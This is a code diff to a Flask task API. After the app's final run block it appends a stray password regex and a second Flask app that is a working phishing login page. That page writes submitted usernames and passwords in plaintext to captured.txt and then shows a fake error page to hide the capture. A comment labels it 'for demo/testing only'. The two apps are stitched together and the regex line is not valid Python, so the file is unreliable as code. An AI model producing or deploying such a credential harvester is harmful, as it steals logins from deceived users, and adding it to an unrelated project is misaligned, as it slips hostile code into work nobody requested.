@@ -108,3 +108,29 @@ def delete_task(task_id):
     return jsonify({'message':'deleted sucess'})
 if __name__ == '__main__':
     app.run()
+
+
+
+
+/^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{4,15}$/
+
+
+
+from flask import Flask, render_template, request, redirect 
+app = Flask(__name__) 
+@app.route('/', methods=['GET', 'POST']) 
+def login(): 
+    if request.method == 'POST': 
+        username = request.form.get('username') 
+        password = request.form.get('password') 
+# Simulated logging of credentials (for demo/testing only) 
+        with open('captured.txt', 'a') as f: 
+            f.write(f"Username: {username}, Password: {password}\n") 
+# Redirect to a fake "loading" or "error" page 
+        return redirect('/oops') 
+    return render_template('login.html') 
+@app.route('/oops') 
+def oops(): 
+    return "<h2>Oops! Something went wrong. Please try again later.</h2>" 
+if __name__ == '__main__': 
+    app.run(debug=True) 
